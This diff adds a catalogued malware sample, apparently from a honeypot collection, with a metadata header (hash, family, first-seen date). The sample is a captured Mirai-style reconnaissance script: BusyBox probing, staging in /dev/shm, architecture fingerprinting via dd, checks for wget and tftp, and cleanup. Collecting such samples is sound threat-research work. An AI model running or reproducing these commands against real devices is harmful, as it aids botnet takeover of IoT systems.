@@ -1,0 +1,20 @@
+# sha256: 1cd4efd65e4561e781e9ba1a28a8f6a2fa11632f032888e998c2cffd11736017
+# family: script_generic
+# kind: script
+# size_bytes: 254
+# first_seen: 2026-04-15 00:46:40.558720 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox QYLAI
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QYLAI
+tftp; wget; /bin/busybox QYLAI
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox QYLAI
+rm .s; exit
+q
